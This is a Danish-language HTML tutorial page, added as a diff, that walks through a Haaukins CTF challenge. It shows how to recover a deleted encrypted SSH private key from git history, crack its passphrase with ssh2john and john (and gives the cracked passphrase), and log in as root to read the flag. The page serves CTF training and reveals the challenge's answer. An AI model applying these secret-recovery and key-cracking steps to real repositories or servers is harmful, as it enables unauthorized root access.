@@ -1,0 +1,38 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: IaC privatekey in history — tutorial (git-secrets)</title>
+<meta name="description" content="Guide til Haaukins IaC privatekey: hent en &#x27;slettet&#x27; krypteret SSH-nøgle ud af git-historikken, knæk passphrasen med ssh2john, og brug nøglen til at nå root.">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>IaC privatekey (in history)</h1>
+<p class="subtitle">Hent en 'slettet' nøgle ud af git-historikken og knæk den.</p>
+<div class="badges"><span class="badge cat">Forensics / IaC</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+
+<h2>Trin for trin</h2>
+<pre><code>cd ~/infrastructure &amp;&amp; git log --oneline --all     # commit-beskeder = vektor + hint
+# hent 'slettede' blobs (slettet fil = stadig et git-objekt):
+git rev-list --all --objects | awk '{print $1}' | while read o; do \
+  [ "$(git cat-file -t $o)" = blob ] &amp;&amp; git cat-file -p $o 2>/dev/null | grep -q 'PRIVATE KEY' &amp;&amp; echo $o; done
+ssh2john key.enc > key.john &amp;&amp; john --wordlist=rockyou.txt key.john   # -> sexygirl1
+ssh -i key.enc -o PubkeyAcceptedKeyTypes=+ssh-rsa root@&lt;ip&gt; 'cat /root/flag.txt'</code></pre>
+             <p>Decoy: en ukrypteret nøgle giver også root men et forkert flag. Titlen siger "<strong>protected</strong>"
+             → det er den krypterede nøgle der har det rigtige.</p>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Flaget ligger i <code>/root/flag.txt</code> på den droplet den krypterede nøgle hører til (per-instans).</p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li><code>git rev-list --all --objects</code> + <code>git cat-file</code> henter 'slettede' hemmeligheder frem.</li><li>Passphrase-beskyttede nøgler → <code>ssh2john</code> + john; nyere OpenSSH kræver <code>+ssh-rsa</code>.</li><li>Læs titlen for at vælge den rigtige nøgle (decoy-fælde).</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
